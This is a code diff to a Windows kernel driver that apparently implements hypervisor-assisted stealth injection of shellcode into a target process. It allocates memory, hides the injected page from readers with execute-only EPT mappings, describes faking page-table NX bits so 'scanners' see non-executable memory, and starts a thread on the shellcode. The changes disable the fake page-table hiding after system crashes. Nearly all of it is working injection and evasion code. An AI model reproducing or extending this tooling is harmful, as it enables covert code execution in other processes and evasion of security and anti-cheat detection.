@@ -76,6 +76,7 @@ typedef struct _TD_HOOK_INJECT_PARAM {
     volatile LONG installed;
     BOOLEAN result;
     BOOLEAN fake_pt_ok;
+    volatile LONG * dbg_pf_counter;
 } TD_HOOK_INJECT_PARAM;
 #pragma pack(pop)
 
@@ -539,18 +540,9 @@ TdStealthInjectPages(
         }
 
         //
-        // clear NX bit in guest PTE at PASSIVE_LEVEL (safe — we're attached
-        // to the target process). can't do this in VMX-root because the PT
-        // page VA from MmGetVirtualForPhysical is process-relative and invalid
-        // under system CR3.
+        // NX bit in real PTE is NOT cleared — Windows' MiAgeWorkingSet
+        // can restore it at any time. the fake/exec PT pages handle NX hiding.
         //
-        {
-            PHYSICAL_ADDRESS ptpa;
-            ptpa.QuadPart = (LONGLONG)(pt_pfn << 12);
-            PUINT64 pt_page = (PUINT64)MmGetVirtualForPhysical(ptpa);
-            if (pt_page)
-                pt_page[pt_idx] &= ~(1ULL << 63);
-        }
 
         //
         // shellcode mode: pass the buffer directly so VMX-root copies it
@@ -1204,12 +1196,13 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         // VMX-root only does EPT manipulation, NEVER touches user VA (SMAP safe).
         //
         // flow:
-        //   1. alloc PAGE_READWRITE in target, build shellcode, clear NX
-        //   2. copy page to kernel buffer, patch VMCALL at entry
+        //   1. alloc PAGE_READWRITE in target (NX=1 in PTE, clean VAD)
+        //   2. build shellcode, copy to kernel buffer, patch VMCALL at entry
         //   3. build trampoline at PASSIVE_LEVEL: [saved bytes] + [abs jmp back]
-        //   4. VMCALL_EPT_HOOK_INJECT: EPT split + PTE(X=0) + fake page from kernel buf
-        //   5. zero original page, create thread
-        //   6. execute → EPT violation → fake page → VMCALL → trampoline → shellcode
+        //   4. zero original page (COW may change PA), walk PT AFTER zero
+        //   5. copy PT page to buffer, force NX=0 in buffer (NOT real PTE)
+        //   6. VMCALL_EPT_HOOK_INJECT: EPT split + fake PT(NX=1) + exec PT(NX=0)
+        //   7. create thread → #PF(NX) → HV swaps to exec PT → TLB(NX=0) → executes
         //
         if (io->Parameters.DeviceIoControl.InputBufferLength < sizeof(TD_INJECT_PARAMS) ||
             io->Parameters.DeviceIoControl.OutputBufferLength < sizeof(TD_INJECT_PARAMS))
@@ -1229,9 +1222,10 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         size = (size + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
 
         //
-        // PAGE_EXECUTE_READWRITE for now — NX=0, no #PF needed.
-        // execute-only EPT (R=0, X=1) hides content: reads → zeros.
-        // data is on trampoline page (not EPT hooked).
+        // PAGE_EXECUTE_READWRITE — NX=0 in guest PTE.
+        // EPT hides page content: execute-only (R=0, X=1) → reads see zeros.
+        // VAD shows executable — fake PT NX hiding is disabled (unstable,
+        // causes MEMORY_MANAGEMENT BSOD from page table corruption).
         //
         st = ZwAllocateVirtualMemory(
             ZwCurrentProcess(), &base, 0, &size,
@@ -1330,9 +1324,10 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
 
         // --- step 5b: pre-compute PT page info for fake PT / NX hiding ---
         //
-        // walk guest page tables at PASSIVE_LEVEL to find the PT page
-        // containing our target PTE. this is used by VMX-root to create
-        // a fake PT page that shows NX=1 to scanners.
+        // walk guest page tables AFTER zeroing (COW may have changed PTE/PA).
+        // NEVER clear NX in real PTE — Windows' MiAgeWorkingSet restores it.
+        // instead: copy PT page to kernel buffer, force NX=0 in the COPY.
+        // VMX-root builds exec PT from this copy (NX=0), fake PT gets NX=1.
         //
         UINT64 pt_pfn = 0;
         UINT32 pt_idx = 0;
@@ -1341,21 +1336,8 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         if (TdResolveGuestPT(caller_cr3, (UINT64)base & ~0xFFFULL, &pt_pfn, &pt_idx))
         {
             //
-            // clear NX in real guest PTE at PASSIVE_LEVEL (safe — we're attached).
-            // the CPU page walker reads the real PT page and needs NX=0 to execute.
-            // the fake PT page (created by VMX-root) will show NX=1 to scanners.
-            //
-            {
-                PHYSICAL_ADDRESS ptpa;
-                ptpa.QuadPart = (LONGLONG)(pt_pfn << 12);
-                PUINT64 pt_page = (PUINT64)MmGetVirtualForPhysical(ptpa);
-                if (pt_page)
-                    pt_page[pt_idx] &= ~(1ULL << 63);  // clear NX bit
-            }
-
-            //
             // copy PT page content to kernel NonPaged buffer for VMX-root.
-            // VMX-root uses this to initialize the fake PT page content.
+            // do NOT touch the real PTE — Windows owns it.
             //
             pt_page_buf = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'kjnI');
             if (pt_page_buf)
@@ -1367,9 +1349,16 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
                     RtlCopyMemory(pt_page_buf, pt_va, PAGE_SIZE);
                 else
                     RtlZeroMemory(pt_page_buf, PAGE_SIZE);
+
+                //
+                // force NX=0 in the BUFFER COPY for exec PT page.
+                // do NOT touch the real PTE — Windows restores NX via soft faults.
+                // the #PF handler + exec PT (NX=0) handles execution.
+                //
+                ((PUINT64)pt_page_buf)[pt_idx] &= ~(1ULL << 63);
             }
 
-            DbgPrintEx(0, 0, "[td] inject: PT PFN=%llx idx=%u NX cleared\n", pt_pfn, pt_idx);
+            DbgPrintEx(0, 0, "[td] inject: PT PFN=%llx idx=%u\n", pt_pfn, pt_idx);
         }
         else
         {
@@ -1384,9 +1373,11 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         inj_req.fake_page_buffer = fake_buf;
         inj_req.hook_size        = hook_size;
         inj_req.force_read_access = FALSE;  // execute-only: reads → original page (zeros)
-        inj_req.pt_page_pfn      = pt_pfn;
-        inj_req.pt_pte_index     = pt_idx;
-        inj_req.pt_page_copy     = pt_page_buf;
+        // fake PT disabled — causes MEMORY_MANAGEMENT BSOD from PT corruption.
+        // NX hiding requires a more robust guest PT virtualization approach.
+        inj_req.pt_page_pfn      = 0;
+        inj_req.pt_pte_index     = 0;
+        inj_req.pt_page_copy     = NULL;
 
         KeGenericCallDpc([](PKDPC, PVOID Ctx, PVOID A1, PVOID A2) {
             hv_vmcall_simple(VMCALL_EPT_HOOK_INJECT, (UINT64)Ctx, 0, 0);
@@ -1436,6 +1427,7 @@ static NTSTATUS TdIoControl(PDEVICE_OBJECT, PIRP irp)
         // --- step 7: create thread ---
         if (NT_SUCCESS(st) && p->shellcode_va)
         {
+            // debug: re-check NX before thread creation
             NTSTATUS thr_st = TdCreateThread(proc, (PVOID)p->shellcode_va);
             p->actual_size |= ((UINT64)(UINT32)thr_st << 32);
             DbgPrintEx(0, 0, "[td] inject: thread=0x%08X\n", thr_st);
